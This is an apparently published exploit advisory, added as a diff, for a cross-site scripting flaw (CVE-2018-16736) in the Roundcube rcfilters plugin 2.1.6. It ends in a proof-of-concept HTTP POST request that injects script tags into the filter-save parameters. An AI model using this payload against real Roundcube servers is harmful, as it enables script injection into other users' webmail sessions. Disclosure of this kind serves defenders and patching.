@@ -1,0 +1,31 @@
+# Exploit Title: Roundcube rcfilters plugin 2.1.6 - Cross-Site Scripting
+# Date: 2018-09-09
+# Exploit Author: Fahimeh Rezaei
+# Vendor Homepage: https://plugins.roundcube.net/packages/eagle00789/rcfilters
+# Software Link: https://plugins.roundcube.net/packages/eagle00789/rcfilters
+# Version: rcfilters plugin v2.1.6
+# Tested on: Roundcube version 1.0.5
+# CVE : CVE-2018-16736
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16736
+# https://nvd.nist.gov/vuln/detail/CVE-2018-16736
+# https://github.com/eagle00789/RC_Filters/issues/19
+
+# Details:
+# In the rcfilters plugin 2.1.6 for Roundcube, XSS exists via the 
+# _whatfilter and _messages parameters (in the Filters section of the settings).
+
+# PoC
+
+POST /rc/?_task=settings&_action=plugin.filters-save HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 119
+Referer: https://Target/rc/?_action=plugin.filters&_task=settings
+Cookie: roundcube_sessid=; roundcube_sessauth=
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+_token=09bcde247d252364ea55c217c7654a1f&_whatfilter=from]<script>alert('XSS-1')</script>&_searchstring=whatever&_casesensitive=1&_folders=INBOX&_messages=all])<script>alert('XSS-2')</script>
